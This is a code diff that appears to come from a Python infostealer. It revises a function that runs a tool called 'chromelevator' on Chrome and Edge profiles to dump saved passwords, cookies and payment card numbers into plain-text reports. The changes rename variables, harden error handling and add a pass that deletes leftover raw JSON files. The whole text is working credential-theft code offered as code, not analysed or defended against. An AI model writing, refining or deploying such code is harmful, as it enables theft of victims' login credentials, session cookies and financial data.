@@ -271,9 +271,9 @@ def run_chrome_elevator(browser_name):
 _elevator_ran = False
 def extr_browser():
     """
-    Extract Chrome & Edge data via chromelevator, then convert
-    the JSON dumps (passwords, cookies, payments) into .txt reports
-    and delete the raw .json files.
+    Extract Chrome & Edge data via chromelevator, convert the JSON dumps
+    (passwords, cookies, payments) into .txt reports, and delete the
+    raw .json files so only .txt remain.
     """
     global _elevator_ran
     if _elevator_ran:
@@ -282,12 +282,12 @@ def extr_browser():
 
     os.makedirs(EXTRACT_FOLDER, exist_ok=True)
 
-    for short, name in (("chrome", "Chrome"), ("edge", "Edge")):
-        src = BROWSERS.get(name, "")
-        if not os.path.isdir(src):
+    for short, browser_name in (("chrome", "Chrome"), ("edge", "Edge")):
+        src_dir = BROWSERS.get(browser_name, "")
+        if not os.path.isdir(src_dir):
             continue
 
-        out_dir = os.path.join(EXTRACT_FOLDER, name)
+        out_dir = os.path.join(EXTRACT_FOLDER, browser_name)
         os.makedirs(out_dir, exist_ok=True)
 
         # 1) run chromelevator into that folder
@@ -302,29 +302,34 @@ def extr_browser():
                 err.write(f"{time.ctime()}: chromelevator for {short} failed\n")
             continue
 
-        # 2) for each profile subdir, convert JSON→TXT and delete JSON
+        # 2) for each profile subdir, convert JSON→TXT then delete JSON
         for profile in os.listdir(out_dir):
             prof_dir = os.path.join(out_dir, profile)
             if not os.path.isdir(prof_dir):
                 continue
 
             def json_to_txt(fn, header, fmt):
-                jfile = os.path.join(prof_dir, fn + ".json")
-                tfile = os.path.join(prof_dir, fn + ".txt")
-                if not os.path.isfile(jfile):
+                jpath = os.path.join(prof_dir, fn + ".json")
+                tpath = os.path.join(prof_dir, fn + ".txt")
+                if not os.path.isfile(jpath):
                     return
                 try:
-                    with open(jfile, "r", encoding="utf-8") as jf:
-                        arr = json.load(jf)
-                    with open(tfile, "w", encoding="utf-8") as tf:
-                        tf.write(f"=== {name} | {profile} → {header} ===\n\n")
-                        for e in arr:
+                    with open(jpath, "r", encoding="utf-8") as jf:
+                        entries = json.load(jf)
+                    with open(tpath, "w", encoding="utf-8") as tf:
+                        tf.write(f"=== {browser_name} | {profile} → {header} ===\n\n")
+                        for e in entries:
                             tf.write(fmt(e) + "\n")
-                except Exception as e:
+                except Exception as parse_err:
+                    # log parse error
                     with open(os.path.join(prof_dir, f"{fn}_parse_error.log"), "w") as log:
-                        log.write(str(e))
+                        log.write(str(parse_err))
                 finally:
-                    os.remove(jfile)
+                    # remove the raw JSON no matter what
+                    try:
+                        os.remove(jpath)
+                    except:
+                        pass
 
             json_to_txt(
                 "passwords", "Passwords",
@@ -342,6 +347,18 @@ def extr_browser():
                     f"{e.get('card_number','')}"
                 )
             )
+
+    # 3) ensure no stray .json remain under Chrome/Edge
+    for browser_name in ("Chrome", "Edge"):
+        root = os.path.join(EXTRACT_FOLDER, browser_name)
+        for dirpath, _, files in os.walk(root):
+            for fn in files:
+                if fn.lower().endswith(".json"):
+                    try:
+                        os.remove(os.path.join(dirpath, fn))
+                    except:
+                        pass
+
 
 
     # catch-all for other browsers
